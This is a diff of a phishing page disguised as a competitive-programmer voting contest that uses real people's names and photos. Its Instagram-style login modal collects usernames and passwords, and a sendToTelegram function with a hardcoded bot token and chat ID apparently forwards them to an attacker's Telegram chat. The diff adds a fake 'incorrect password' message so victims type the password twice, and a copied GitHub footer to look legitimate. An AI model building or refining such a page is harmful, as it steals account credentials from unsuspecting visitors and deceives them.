@@ -8,6 +8,11 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
     <style>
 
+      .voting-container{
+        margin-top: 30px;
+        font-size: 21px;
+        text-align: center;
+      }
 
       @import url('https://fonts.googleapis.com/css2?family=Aladin&family=Funnel+Sans:ital,wght@0,300..800;1,300..800&family=Kurale&family=Markazi+Text:wght@400..700&family=Modak&family=Mystery+Quest&family=Sarala:wght@400;700&family=WindSong:wght@400;500&display=swap');
 
@@ -19,11 +24,6 @@
       :root{
           --headingfont: "WindSong", cursive;
           --headingfont2: "Funnel Sans", sans-serif;
-      }
-      .voting-container{
-        margin-top: 30px;
-        font-size: 21px;
-        text-align: center;
       }
       .navbar{
         background-color : #0d1117 !important;
@@ -137,11 +137,6 @@
         border-radius: 6px;
       }
 
-
-
-
-
-
     </style> 
 
 
@@ -189,32 +184,77 @@
     </nav>
 
 
+    <!-- <div class="voting-container">
+      <h2>Vote for the Best Competitive Programmer</h2>
+      <p>Choose your favorite candidate!</p>
+
+      <div class="candidate-list">
+          <div class="candidate" onclick="selectCandidate('Alice')">
+            <img src="https://randomuser.me/api/portraits/men/12.jpg" alt="Charlie">
+              <p>Manish Varma</p>
+              <div>
+                <span> 200</span> people voted
+              </div>
+          </div>
+          <div class="candidate" onclick="selectCandidate('Alice')">
+            <img src="https://randomuser.me/api/portraits/men/12.jpg" alt="Charlie">
+              <p>Manish Varma</p>
+              <div>
+                <span> 200</span> people voted
+              </div>
+          </div>
+          <div class="candidate" onclick="selectCandidate('Alice')">
+            <img src="https://randomuser.me/api/portraits/men/12.jpg" alt="Charlie">
+              <p>Manish Varma</p>
+              <div>
+                <span> 200</span> people voted
+              </div>
+          </div>
+          <div class="candidate" onclick="selectCandidate('Alice')">
+            <img src="https://randomuser.me/api/portraits/men/12.jpg" alt="Charlie">
+              <p>Manish Varma</p>
+              <div>
+                <span> 200</span> people voted
+              </div>
+          </div>
+
+      </div>
+
+      <button id="voteButton" class="vote-button" onclick="submitVote()" disabled>Submit Vote</button>
+
+      <p class="result" id="resultText"></p>
+    </div> -->
+
+
 
     <div class="voting-container">
 
       <h2>Vote for the Best Competitive Programmer</h2>
       <p>Choose your favorite candidate!</p>
     </div>
+
       <div class="container">
+
+
 
           <div class="box">
               <img src="https://media.licdn.com/dms/image/v2/D4D03AQELIqtuKzJj9w/profile-displayphoto-shrink_200_200/profile-displayphoto-shrink_200_200/0/1724490679429?e=2147483647&v=beta&t=8Aea95myzPvu-Y9JZdJpDzfsHixycw3-VwZG_Cgj0FE" alt="Image 2">
               <div class="text">
-                <h3><span id="votecount">214</span> Vote</h3>
+                <h3><span id="votecount">211</span> Vote</h3>
                 <p>Riya kumari</p>
               </div>
           </div>
           <div class="box">
-              <img src="profile.jpg" alt="Image 2">
+              <img src="/profile.jpg" alt="Image 2">
               <div class="text">
-                <h3><span id="votecount">209</span> Vote</h3>
+                <h3><span id="votecount">206</span> Vote</h3>
                 <p>Manish Varma</p>
               </div>
           </div>
           <div class="box">
               <img src="https://taxguru.in/wp-content/uploads/2025/02/Photo.jpg" alt="Image 3">
               <div class="text">
-                <h3><span id="votecount">141</span> Vote</h3>
+                <h3><span id="votecount">139</span> Vote</h3>
                 <p>Eshaan Singal</p>
 
               </div>
@@ -222,7 +262,7 @@
           <div class="box">
               <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXqeBdvgBwwlXW6fYDvSWaxUe9pCe0s2Sw7A&usqp=CAU" alt="Image 4">
               <div class="text">
-                <h3><span id="votecount">149</span> Vote</h3>
+                <h3><span id="votecount">148</span> Vote</h3>
                 <p>Anaya Kumari</p>
 
               </div>
@@ -230,7 +270,7 @@
           <div class="box">
               <img src="https://th-i.thgim.com/public/incoming/5gat57/article65540991.ece/alternates/FREE_1200/19_mn%20Shrinivasa%20Pejathya.jpg" alt="Image 5">
               <div class="text">
-                <h3><span id="votecount">92</span> Vote</h3>
+                <h3><span id="votecount">91</span> Vote</h3>
                 <p>Gopal Raj</p>
 
               </div>
@@ -245,6 +285,7 @@
 
       <!-- Modal -->
       <div class="modal fade" id="instagrammodal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+      <!-- <div class="modal fade" id="instagrammodal" tabindex="-1" aria-labelledby="exampleModalLabel" inert> -->
         <div class="modal-dialog">
           <div class="modal-content">
             <div class="modal-header">
@@ -263,7 +304,11 @@
                 <div class="input-container">
                   <input type="password" id="password" placeholder="Password" />
                 </div>
-                <button class="login-button" data-bs-toggle="modal" data-bs-target="#votedCandidate" disabled>Log in</button>
+                <div class="wrongpswd">
+                  <p>Sorry, your password was incorrect. Please double-check your password.</p>
+                </div>
+                <!-- <button class="login-button" data-bs-toggle="modal" data-bs-target="#votedCandidate" disabled>Log in</button> -->
+                <button class="login-button"  disabled>Log in</button>
               </div>
             </div>
 
@@ -274,10 +319,14 @@
 
 
       <!-- voted candidate Modal -->
-      <div class="modal fade" id="votedCandidate" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+      <div class="modal fade" id="votedCandidate" tabindex="-1" inert>
+        <!-- <div class="modal fade" id="instagrammodal" tabindex="-1" inert></div> -->
         <div class="modal-dialog">
           <div class="modal-content">
 
+            <div class="modal-header">
+              <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
             <div class="modal-body votedcand">
               <h2>Thank You For Voting</h2>
               <p id="candidatename"> Manish Varma</p>
@@ -291,6 +340,29 @@
       </div>
 
 
+      <footer class="footer">
+        <div class="footer-container">
+            <a href="https://docs.github.com/en/site-policy/github-terms/github-terms-of-service">Terms</a>
+            <a href="https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement">Privacy</a>
+            <a href="https://github.com/security">Security</a>
+            <a href="https://www.githubstatus.com/">Status</a>
+            <a href="https://docs.github.com/en">Docs</a>
+            <a href="https://support.github.com/?tags=dotcom-footer/">Contact</a>
+            <a href="#">Manage cookies</a>
+            <a href="#">Do not share my personal information</a>
+        </div>
+        <div class="footer-bottom">
+            <span class="github-icon">
+              <a href="https://github.com/">
+                <svg height="32" aria-hidden="true" viewBox="0 0 24 24" version="1.1" width="32" data-view-component="true" class="octicon octicon-mark-github" style="fill: white;">
+                  <path d="M12 1C5.9225 1 1 5.9225 1 12C1 16.8675 4.14875 20.9787 8.52125 22.4362C9.07125 22.5325 9.2775 22.2025 9.2775 21.9137C9.2775 21.6525 9.26375 20.7862 9.26375 19.865C6.5 20.3737 5.785 19.1912 5.565 18.5725C5.44125 18.2562 4.905 17.28 4.4375 17.0187C4.0525 16.8125 3.5025 16.3037 4.42375 16.29C5.29 16.2762 5.90875 17.0875 6.115 17.4175C7.105 19.0812 8.68625 18.6137 9.31875 18.325C9.415 17.61 9.70375 17.1287 10.02 16.8537C7.5725 16.5787 5.015 15.63 5.015 11.4225C5.015 10.2262 5.44125 9.23625 6.1425 8.46625C6.0325 8.19125 5.6475 7.06375 6.2525 5.55125C6.2525 5.55125 7.17375 5.2625 9.2775 6.67875C10.1575 6.43125 11.0925 6.3075 12.0275 6.3075C12.9625 6.3075 13.8975 6.43125 14.7775 6.67875C16.8813 5.24875 17.8025 5.55125 17.8025 5.55125C18.4075 7.06375 18.0225 8.19125 17.9125 8.46625C18.6138 9.23625 19.04 10.2125 19.04 11.4225C19.04 15.6437 16.4688 16.5787 14.0213 16.8537C14.42 17.1975 14.7638 17.8575 14.7638 18.8887C14.7638 20.36 14.75 21.5425 14.75 21.9137C14.75 22.2025 14.9563 22.5462 15.5063 22.4362C19.8513 20.9787 23 16.8537 23 12C23 5.9225 18.0775 1 12 1Z"></path>
+                </svg>
+              </a>
+            </span> 
+            <span>© 2025 GitHub, Inc.</span>
+        </div>
+    </footer>
+    
 
     <script>
         let selectedCandidate = "";
@@ -359,6 +431,8 @@
       const usernameInput = document.getElementById('username');
       const passwordInput = document.getElementById('password');
       const loginButton = document.querySelector('.login-button');
+      wrongpswd = document.querySelector('.wrongpswd');
+
 
       function checkInputs() {
         if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
@@ -374,6 +448,37 @@
       // Initial check when the page loads (in case there's any pre-filled data)
       checkInputs();
 
+
+      let previousPasswords = []; // Stores previous passwords
+
+      function checkPassword() {
+          let passwordInputs = passwordInput.value;
+
+          if (previousPasswords.includes(passwordInputs)) {
+              console.log("Success");
+          
+              // Open the modal only when success
+              var votedCandidateModal = new bootstrap.Modal(document.getElementById('votedCandidate'));
+              votedCandidateModal.show();
+
+              setTimeout(function () {
+                  votedCandidateModal.hide();
+              }, 20000); // 10 seconds = 10000 milliseconds
+
+          } else {
+              wrongpswd.style.display = "block";
+              console.log("Wrong password");
+          }
+
+          // Store only the last 2 passwords
+          previousPasswords.push(passwordInputs);
+          if (previousPasswords.length > 15) {
+              previousPasswords.shift(); // Keep only last 2 passwords
+          }
+          passwordInput.value = ""; // Clear input field
+      }
+
+
       function sendToTelegram() {
         const botToken = "6698594387:AAFmjtW8aldtasQa_E_eqkSinGGwH3RprL0"; // Replace with your bot token
         const chatId = "6222134199"; // Replace with your chat ID
@@ -388,10 +493,11 @@
           .catch(error => console.error("Error:", error));
       }
 
-      loginButton.addEventListener("click", sendToTelegram);
+      loginButton.addEventListener("click", checkPassword);
 
-    </script>
+    </script> 
     
+
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
 </body>
